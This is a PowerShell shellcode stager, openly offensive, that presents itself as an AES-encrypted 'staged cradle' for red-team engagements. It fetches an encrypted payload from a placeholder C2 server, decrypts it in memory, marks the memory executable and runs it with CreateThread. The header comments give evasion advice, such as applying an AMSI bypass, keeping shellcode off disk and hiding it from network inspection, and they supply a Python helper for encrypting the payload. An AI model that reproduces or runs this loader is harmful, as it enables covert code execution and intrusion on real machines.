# ============================================================================
# Starburst Staged Cradle - AES-256-CBC Encrypted Download
# ============================================================================
# Technique:  Download AES-encrypted payload, decrypt in memory, execute
# OPSEC Notes:
#   - Payload is encrypted on the wire — network inspection sees ciphertext.
#   - Shellcode never exists in plaintext on disk.
#   - Key and IV are embedded in the script — protect this script accordingly.
#   - AMSI will inspect this script. Apply AMSI bypass before execution.
#   - Use a unique key per engagement. Do not reuse keys across operations.
#   - The AES key/IV can be derived from a passphrase if preferred.
#   - To encrypt the payload for this stager:
#     python3 -c "
#     from Crypto.Cipher import AES
#     from Crypto.Util.Padding import pad
#     import sys, base64
#     key = bytes.fromhex('SAME_KEY_AS_BELOW')
#     iv  = bytes.fromhex('SAME_IV_AS_BELOW')
#     sc  = open(sys.argv[1],'rb').read()
#     cipher = AES.new(key, AES.MODE_CBC, iv)
#     enc = cipher.encrypt(pad(sc, AES.block_size))
#     open(sys.argv[1]+'.enc','wb').write(enc)
#     " starburst.bin
# ============================================================================

# --- OPERATOR: Set these values ---
$PayloadUrl = "https://your-c2-server.com/starburst.bin.enc"
$AESKeyHex  = "0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f20"
$AESIVHex   = "01020304050607080a0b0c0d0e0f1011"

# Force TLS 1.2
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# P/Invoke definitions
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Win32Staged {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(
        IntPtr lpAddress,
        uint dwSize,
        uint flNewProtect,
        out uint lpflOldProtect
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out uint lpThreadId
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(
        IntPtr hHandle,
        uint dwMilliseconds
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

# Convert hex strings to byte arrays
function ConvertFrom-HexString {
    param([string]$HexString)
    $Bytes = [byte[]]::new($HexString.Length / 2)
    for ($i = 0; $i -lt $HexString.Length; $i += 2) {
        $Bytes[$i / 2] = [Convert]::ToByte($HexString.Substring($i, 2), 16)
    }
    return $Bytes
}

[Byte[]]$Key = ConvertFrom-HexString $AESKeyHex
[Byte[]]$IV  = ConvertFrom-HexString $AESIVHex

# Download encrypted payload
$WebClient = New-Object System.Net.WebClient
$WebClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
$WebClient.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
$WebClient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials

try {
    [Byte[]]$EncryptedPayload = $WebClient.DownloadData($PayloadUrl)
} catch {
    Write-Error "Failed to download payload: $_"
    exit 1
} finally {
    $WebClient.Dispose()
}

if ($EncryptedPayload.Length -eq 0) {
    Write-Error "Downloaded payload is empty"
    exit 1
}

# Decrypt AES-256-CBC
$AES = [System.Security.Cryptography.Aes]::Create()
$AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
$AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$AES.KeySize = 256
$AES.Key = $Key
$AES.IV = $IV

$Decryptor = $AES.CreateDecryptor()
try {
    $MemStream = New-Object System.IO.MemoryStream
    $CryptoStream = New-Object System.Security.Cryptography.CryptoStream(
        $MemStream,
        $Decryptor,
        [System.Security.Cryptography.CryptoStreamMode]::Write
    )
    $CryptoStream.Write($EncryptedPayload, 0, $EncryptedPayload.Length)
    $CryptoStream.FlushFinalBlock()
    [Byte[]]$Shellcode = $MemStream.ToArray()
} catch {
    Write-Error "Decryption failed — check key/IV: $_"
    exit 1
} finally {
    if ($CryptoStream) { $CryptoStream.Dispose() }
    if ($MemStream) { $MemStream.Dispose() }
    if ($Decryptor) { $Decryptor.Dispose() }
    $AES.Dispose()
}

# Clear sensitive data from managed memory
[Array]::Clear($EncryptedPayload, 0, $EncryptedPayload.Length)
[Array]::Clear($Key, 0, $Key.Length)
[Array]::Clear($IV, 0, $IV.Length)

# Constants
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_READWRITE = 0x04
$PAGE_EXECUTE_READ = 0x20
$INFINITE = 0xFFFFFFFF

# Allocate RW memory
$Address = [Win32Staged]::VirtualAlloc(
    [IntPtr]::Zero,
    [uint32]$Shellcode.Length,
    ($MEM_COMMIT -bor $MEM_RESERVE),
    $PAGE_READWRITE
)

if ($Address -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed"
    exit 1
}

# Copy decrypted shellcode to allocated memory
[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $Address, $Shellcode.Length)

# Clear decrypted shellcode from managed memory
[Array]::Clear($Shellcode, 0, $Shellcode.Length)

# Flip RW to RX
$OldProtect = 0
[Win32Staged]::VirtualProtect($Address, [uint32]$Shellcode.Length, $PAGE_EXECUTE_READ, [ref]$OldProtect) | Out-Null

# Execute via CreateThread
$ThreadId = 0
$ThreadHandle = [Win32Staged]::CreateThread(
    [IntPtr]::Zero, 0, $Address, [IntPtr]::Zero, 0, [ref]$ThreadId
)

if ($ThreadHandle -eq [IntPtr]::Zero) {
    Write-Error "CreateThread failed"
    exit 1
}

[Win32Staged]::WaitForSingleObject($ThreadHandle, $INFINITE) | Out-Null
[Win32Staged]::CloseHandle($ThreadHandle) | Out-Null
